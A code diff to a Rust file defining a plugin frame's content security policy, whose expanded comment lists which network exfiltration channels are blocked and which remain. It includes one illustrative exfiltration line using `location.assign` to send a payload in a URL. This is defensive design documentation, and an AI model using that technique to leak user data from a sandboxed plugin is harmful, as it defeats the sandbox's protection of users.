@@ -37,12 +37,26 @@ fn escape_attribute(value: &str) -> String {
 /// The frame document's own content security policy. The frame may load scripts, styles,
 /// images and fonts from the `atlas-plugin` scheme (its own files, under both the macOS
 /// and Linux `atlas-plugin:` form and the Windows `http://atlas-plugin.localhost` one) and
-/// nothing else: `connect-src 'none'` stops a plugin calling out to the network,
-/// `frame-src 'none'` and `base-uri 'none'` stop it embedding or rebasing onto a remote
-/// page, and `form-action 'none'` stops it navigating itself away by submitting a form.
+/// nothing else.
+///
+/// What this closes: `connect-src 'none'` stops `fetch`, `XMLHttpRequest`, `WebSocket` and
+/// `sendBeacon`; the `script-src`, `style-src`, `img-src` and `font-src` lists stop a
+/// remote subresource being loaded (and so used as a channel); `frame-src 'none'` stops
+/// the document nesting another browsing context; `form-action 'none'` stops a form
+/// submission leaving; `base-uri 'none'` stops a `<base href>` rebasing relative URLs.
+/// The sandbox flags close the neighbours: without `allow-top-navigation` the app's own
+/// window is safe, and without `allow-popups` `window.open` is inert.
+///
+/// What it does not close, accepted and documented: a script-initiated navigation of the
+/// frame itself. CSP has no directive for it (`navigate-to` was specified and dropped, and
+/// never shipped), so `location.assign('https://…?d=' + payload)` still leaves. This is
+/// not an escalation: a page the plugin navigates itself to holds only the permissions the
+/// plugin already had, so it reaches nothing the plugin author could not reach anyway. A
+/// hostile or compromised plugin is the threat the install-time permission list exists
+/// for, not one this policy is meant to answer. See Task 3a's concern 9.
 ///
 /// This does not restrict `postMessage`, which CSP does not govern, so everything a
-/// plugin is meant to do still works: the bridge is the only way out either way.
+/// plugin is meant to do still works: the bridge is the only way in.
 const FRAME_CSP: &str = "default-src 'none'; script-src atlas-plugin: http://atlas-plugin.localhost; style-src 'unsafe-inline' atlas-plugin: http://atlas-plugin.localhost; img-src atlas-plugin: http://atlas-plugin.localhost data:; font-src atlas-plugin: http://atlas-plugin.localhost data:; connect-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'";
 
 /// The generated frame document, `<id>/__frame`. `main` is the manifest's entry point,
